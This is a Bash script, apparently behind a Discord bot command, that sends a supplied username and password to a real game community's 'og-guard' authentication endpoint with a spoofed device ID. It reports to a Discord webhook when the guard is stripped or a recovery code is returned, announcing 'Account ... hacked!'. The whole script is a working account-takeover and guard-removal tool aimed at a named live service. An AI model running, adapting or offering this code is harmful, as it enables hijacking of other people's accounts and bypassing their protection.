discord_WEBHOOK=$(cat config/config.txt | grep "webhook" | sed "s/<webhook>//g")
discord_adminID=$(cat config/config.txt | grep "admin" | sed "s/<administratorID>//g")

discord_content_argument3=$1
discord_content_argument4=$2

send_post_request() {

	http POST "$discord_WEBHOOK" \
	content="$webhook_msg"

}

send_post_request_w1() {

	http POST "$discord_WEBHOOK" \
	content="$webhook_msg"

}

invalid_char() {

	webhook_msg="**C**ontine caractere ilegale"
	send_post_request "$webhook_msg"
}

invalid_string_len() {

		webhook_msg="**N**ume sau parola prea scurta/lunga"
		send_post_request "$webhook_msg"
}

echo "ARGUMENT1: $discord_content_argument3"
echo "ARGUMENT2: $discord_content_argument4"
echo "$user"
echo "$discord_adminID"

if [[ -z "$discord_content_argument3" ]];then
	webhook_msg="**/**stropitoare crack username password"
	send_post_request "$webhook_msg"
else
	if [[ $(echo "$discord_content_argument3" | grep '<\|>\|&\|%\|~\|/\|*\|#') ]];then
		invalid_char
	else
		if [[ "$(echo "$discord_content_argument3" | wc -m)" -lt 3 && "$(echo "$discord_content_argument3" | wc -m)" -gt 25  ]];then
			invalid_string_len
		else
			:
		fi
		if [[ -z "$discord_content_argument4" ]];then
			webhook_msg="**/**stropitoare crack username password"
			send_post_request "$webhook_msg"
		else
			if [[ $(echo "$discord_content_argument4" | grep '<\|>\|&\|%\|~\|/\|*\|#') ]];then
				invalid_char
			else
				if [[ "$(echo "$discord_content_argument4" | wc -m)" -lt 3 || "$(echo "$discord_content_argument4" | wc -m)" -gt 50  ]];then
					invalid_string_len
				else
					uuid=$(uuidgen -r)
					request=$(http --form POST 'http://og-times.ro/og-guard/apprequest.php' \
					'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
					'Connection: close' \
					device='Samsung' \
					username="$discord_content_argument3" \
					uid="$uuid" \
					password="$discord_content_argument4")
					if [[ "$request" =~ "Autentificatorul a fost inlaturat" ]];then
						webhook_msg="**A**ccount **$discord_content_argument3** hacked! "
						send_post_request $discord_WEBHOOK
					elif [[ "$request" =~ "rcode" ]];then
						rcode=$(echo "$request" | jq -r ".rcode")
						webhook_msg="**A**ccount **$discord_content_argument3** hacked! RCODE: **$rcode**"
						send_post_request $webhook_msg
					elif [[ "$request" =~ "Nu esti autorizat sa te loghezi" ]];then
						webhook_msg="**A**ccount hacked! Dar are OG-Guard..."
						send_post_request $webhook_msg
					else
						webhook_msg="**C**ontul nu a putut fii spart"
						send_post_request $webhook_msg
					fi

				fi
			fi
		fi
	fi
fi
